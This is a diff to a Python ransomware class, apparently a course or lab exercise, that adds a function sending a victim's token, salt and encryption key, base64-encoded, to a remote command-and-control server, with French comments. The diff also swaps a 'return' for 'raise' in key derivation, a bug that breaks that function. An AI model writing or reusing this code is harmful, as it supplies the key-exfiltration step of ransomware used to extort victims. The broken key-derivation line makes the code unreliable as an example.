@@ -45,16 +45,35 @@ class SecretManager:
             salt=salt,
             iterations=ITERATION,
         )
-        return clef.derive(key)
+        raise clef.derive(key)
 
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
+    
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+        # Création de l'URL de destination
+        url = f"http://{self._remote_host_port}/new"
 
-    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        # Encodage des données en base64 pour l'envoi
+        data = {
+        "token": self.bin_to_b64(token),
+        "salt": self.bin_to_b64(salt),
+        "key": self.bin_to_b64(key),
+        }
+
+        # Envoi des données
+        response = requests.post(url, json=data)
+
+        # Vérifier le statut de la réponse
+        if response.status_code == 200:
+            # Message de réussite si la réponse a un code 200
+            self._log.info("Data sent to CNC successfully")
+        else:
+            # Message d'erreur si la réponse a un code différent de 200
+            self._log.error(f"Failed to send data to CNC: {response.text}")
+
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
